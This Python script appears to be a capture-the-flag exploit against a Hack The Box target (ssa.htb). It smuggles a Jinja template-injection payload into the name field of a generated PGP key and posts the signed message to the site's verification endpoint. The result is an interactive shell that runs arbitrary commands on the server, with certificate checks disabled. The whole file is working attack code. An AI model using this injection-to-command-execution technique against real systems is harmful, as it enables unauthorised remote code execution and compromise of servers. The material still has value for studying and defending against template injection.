import sys
import gnupg
import requests
import html

requests.packages.urllib3.disable_warnings()

def generate_pgp_keys(name, email):
    gpg = gnupg.GPG()

    input_data = gpg.gen_key_input(
        key_type="RSA",
        key_length=2048,
        name_real=name,
        name_email=email,
        passphrase="password"
    )

    key = gpg.gen_key(input_data)
    public_key = gpg.export_keys(key.fingerprint)

    return key, public_key

def sign_message(message, key):
    gpg = gnupg.GPG()
    signed_message = gpg.sign(message, keyid=key.fingerprint, passphrase="password")
    
    return signed_message

def send_request(signed_message, public_key):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    data = { 'signed_text': signed_message, 'public_key': public_key }

    response = requests.post('https://ssa.htb/process', headers=headers, data=data, verify=False)

    print(html.unescape(response.text.split("\"")[1].replace("<amogus@imposter.sus>","")))
    print()
    
def main():
    user_session = True
    cwd = "/home/atlas/"

    while user_session:
        try:
            command = input("$ ")

            if "cd" in command:
                if not "/" in command:
                    cwd += "/" + command.split(" ")[1]
                cwd = command.split(" ")[1]
            

            real_name = "{{" + f"self.__init__.__globals__.__builtins__.__import__('os').popen('cd {cwd}; {command}').read()" + "}}"
            email = "amogus@imposter.sus"

            key, public_key = generate_pgp_keys(real_name, email)
        
            message = "DEINE MUTTER IST FETT!"
            signed_message = sign_message(message, key)

            send_request(signed_message, public_key)
            
        except KeyboardInterrupt:
            print("\nExiting...")
            sys.exit(0)

if __name__ == "__main__":
    main()
